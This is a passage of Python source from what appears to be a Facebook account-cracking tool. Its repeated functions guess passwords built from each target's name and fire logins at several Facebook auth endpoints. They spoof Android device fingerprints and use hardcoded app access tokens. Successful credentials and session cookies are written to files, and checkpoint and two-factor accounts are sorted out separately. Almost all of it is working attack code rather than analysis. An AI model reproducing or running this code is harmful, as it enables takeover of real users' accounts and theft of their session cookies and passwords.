                        "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                        "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                        "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                        "X-FB-Friendly-Name": "authenticate",
                        "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                        "User-Agent": _____UpDaTe_S2_____(),
                        "Accept-Encoding": "gzip, deflate",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "X-FB-HTTP-Engine": "Liger"
                        }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m[ERROR-OK💚] '+ids+' | '+pas)
                                        q = po
                                        powerERROR = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ERRORramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ERRORramxan};{powerERROR}"
                                        open('/sdcard/ERROR-ZONE/ERROR-FILE-M2-COOKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/ERROR-ZONE/ERROR-FILE-M2-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[ERROR-2F💔] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[ERROR-CP💔] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ERROR-ZONE/ERROR-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ERROR-ZONE/ERROR-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api2(ids,names,passlist)
        except Exception as e:
                pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE M3 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                color = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write(f"\r\r\x1b[1;97m[ERROR-XD-M3\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['Zong','null','Banglalink','Roshan','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/250.0.0.11.114;FBBV/28055324;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-P905V;FBSV/11;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        __locale__ = {
                        "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                        "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"
                        }
                        country_locale = random.choice(list(__locale__.keys()))
                        country_code = __locale__[country_locale]
                        pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                        data = {
                        "adid": adid,
                        "format": "json",
                        "device_id": device_id,
                        "email": ids,
                        "password": f"#{pax}:0:{int(time.time())}:{pas}",
                        "session_id": str(uuid.uuid4()),
                        "advertiser_id": str(uuid.uuid4()),
                        "reg_instance": str(uuid.uuid4()),
                        "logged_out_id": str(uuid.uuid4()),
                        "hash_id": str(uuid.uuid4()),
                        "sim_country": "id",
                        "network_country": "id",
                        "enroll_misauth": "false",
                        "generate_analytics_claims": "1",
                        "credentials_type": "password",
                        "source": "login",
                        "error_detail_type": "button_with_disabled",
                        "enroll_misauth": "false",
                        "cpl": "true",
                        "generate_session_cookies": "1",
                        "generate_machine_id": "1",
                        "meta_inf_fbmeta": "",
                        "currently_logged_in_userid": "0",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers = {
                        "Authorization": f"OAuth {accessToken}",
                        "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                        "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                        "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                        "X-FB-Friendly-Name": "authenticate",
                        "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                        "User-Agent": _____UpDaTe_S2_____(),
                        "Accept-Encoding": "gzip, deflate",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "X-FB-HTTP-Engine": "Liger"
                        }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ERROR-OK💚] '+ids+' | '+pas)
                                        get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        open('/sdcard/ERROR-ZONE/ERROR-FILE-M3-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/ERROR-ZONE/ERROR-FILE-M3-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[ERROR-2F💔] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[ERROR-CP💔] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ERROR-ZONE/ERROR-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ERROR-ZONE/ERROR-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api3(ids,names,passlist)
        except Exception as e:
                pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE M4 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                color = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write(f"\r\r\x1b[1;97m[ERROR-XD-M4\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['Zong','null','Banglalink','Roshan','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/296.0.0.17.137;FBBV/21810039;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/368298519;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-R910;FBSV/5;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        __locale__ = {
                        "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                        "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"
                        }
                        country_locale = random.choice(list(__locale__.keys()))
                        country_code = __locale__[country_locale]
                        pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                        data = {
                        "adid": adid,
                        "format": "json",
                        "device_id": device_id,
                        "email": ids,
                        "password": f"#{pax}:0:{int(time.time())}:{pas}",
                        "session_id": str(uuid.uuid4()),
                        "advertiser_id": str(uuid.uuid4()),
                        "reg_instance": str(uuid.uuid4()),
                        "logged_out_id": str(uuid.uuid4()),
                        "hash_id": str(uuid.uuid4()),
                        "sim_country": "id",
                        "network_country": "id",
                        "enroll_misauth": "false",
                        "generate_analytics_claims": "1",
                        "credentials_type": "password",
                        "source": "login",
                        "error_detail_type": "button_with_disabled",
                        "enroll_misauth": "false",
                        "cpl": "true",
                        "generate_session_cookies": "1",
                        "generate_machine_id": "1",
                        "meta_inf_fbmeta": "",
                        "currently_logged_in_userid": "0",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers = {
                        "Authorization": f"OAuth {accessToken}",
                        "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                        "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                        "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                        "X-FB-Friendly-Name": "authenticate",
                        "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                        "User-Agent": UA(),
                        "Accept-Encoding": "gzip, deflate",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "X-FB-HTTP-Engine": "Liger"
                        }
                        url = 'https://graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m[ERROR-OK💚] '+ids+' | '+pas)
                                        get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        open('/sdcard/ERROR-ZONE/ERROR-FILE-M4-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/ERROR-ZONE/ERROR-FILE-M4-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[ERROR-2F💔] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[ERROR-CP💔] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ERROR-ZONE/ERROR-FILE-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ERROR-ZONE/ERROR-FILE-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api4(ids,names,passlist)
        except Exception as e:
                pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE M5 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                color = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write(f"\r\r\x1b[1;97m[ERROR-XD-M5\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636690;FBDM/{density=2.0,width=720,height=1184};FBLC/es_ES;FBRV/208541728;FBCR/TELCEL;FBMF/ZENEK;FBBD/ZENEK;FBPN/com.facebook.katana;FBDV/Libelula Z6001;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        __locale__ = {
                        "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                        "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"
                        }
                        country_locale = random.choice(list(__locale__.keys()))
                        country_code = __locale__[country_locale]
                        pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                        data = {
                        "adid": adid,
                        "format": "json",
                        "device_id": device_id,
                        "email": ids,
                        "password": f"#{pax}:0:{int(time.time())}:{pas}",
                        "session_id": str(uuid.uuid4()),
                        "advertiser_id": str(uuid.uuid4()),
                        "reg_instance": str(uuid.uuid4()),
                        "logged_out_id": str(uuid.uuid4()),
                        "hash_id": str(uuid.uuid4()),
                        "sim_country": "id",
                        "network_country": "id",
                        "enroll_misauth": "false",
                        "generate_analytics_claims": "1",
                        "credentials_type": "password",
                        "source": "login",
                        "error_detail_type": "button_with_disabled",
                        "enroll_misauth": "false",
                        "cpl": "true",
                        "generate_session_cookies": "1",
                        "generate_machine_id": "1",
                        "meta_inf_fbmeta": "",
                        "currently_logged_in_userid": "0",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers = {
                        "Authorization": f"OAuth {accessToken}",
                        "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                        "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                        "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                        "X-FB-Friendly-Name": "authenticate",
                        "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                        "User-Agent": UA1(),
                        "Accept-Encoding": "gzip, deflate",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "X-FB-HTTP-Engine": "Liger"
                        }
                        url = 'https://b-api.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m[ERROR-OK💚] '+ids+' | '+pas)
                                        q = po
                                        powerERROR = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ERRORramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ERRORramxan};{powerERROR}"
                                        open('/sdcard/ERROR-ZONE/ERROR-FILE-M5-COOKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/ERROR-ZONE/ERROR-FILE-M5-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[ERROR-2F💔] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[ERROR-CP💔] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ERROR-ZONE/ERROR-FILE-M5-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ERROR-ZONE/ERROR-FILE-M5-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api5(ids,names,passlist)
        except Exception as e:
                pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE M6 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api6(ids,names,passlist):
        try:
                global ok,loop,sim_id
                color = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write(f"\r\r\x1b[1;97m[ERROR-XD-M6\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[{color}{loop}\x1b[1;97m]\x1b[1;97m-\x1b[1;97m[\x1b[1;92mOK-:{len(oks)}\x1b[1;97m]\x1b[1;97m");sys.stdout.flush()
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['Zong','null','Banglalink','Roshan','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/250.0.0.11.114;FBBV/28055324;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-P905V;FBSV/11;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        __locale__ = {
                        "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                        "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"
                        }
                        country_locale = random.choice(list(__locale__.keys()))
                        country_code = __locale__[country_locale]
                        pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                        data = {
                        "adid": adid,
                        "format": "json",
                        "device_id": device_id,
                        "email": ids,
                        "password": f"#{pax}:0:{int(time.time())}:{pas}",
                        "session_id": str(uuid.uuid4()),
                        "advertiser_id": str(uuid.uuid4()),
                        "reg_instance": str(uuid.uuid4()),
                        "logged_out_id": str(uuid.uuid4()),
                        "hash_id": str(uuid.uuid4()),
                        "sim_country": "id",
                        "network_country": "id",
                        "enroll_misauth": "false",
                        "generate_analytics_claims": "1",
                        "credentials_type": "password",
                        "source": "login",
                        "error_detail_type": "button_with_disabled",
                        "enroll_misauth": "false",
                        "cpl": "true",
                        "generate_session_cookies": "1",
                        "generate_machine_id": "1",
                        "meta_inf_fbmeta": "",
                        "currently_logged_in_userid": "0",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers = {
                        "Authorization": f"OAuth {accessToken}",
                        "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                        "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                        "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                        "X-FB-Friendly-Name": "authenticate",
                        "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                        "User-Agent": f4(),
                        "Accept-Encoding": "gzip, deflate",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "X-FB-HTTP-Engine": "Liger"
                        }
                        url = 'https://api.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ERROR-OK💚] '+ids+' | '+pas)
                                        get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        open('/sdcard/ERROR-ZONE/ERROR-FILE-M6-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/ERROR-ZONE/ERROR-FILE-M6-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[ERROR-2F💔] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[ERROR-CP💔] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ERROR-ZONE/ERROR-FILE-M6-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ERROR-ZONE/ERROR-FILE-M6-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api6(ids,names,passlist)
        except Exception as e:
                pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE M7 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api7(ids,names,passlist):
        try:
                global ok,loop,sim_id
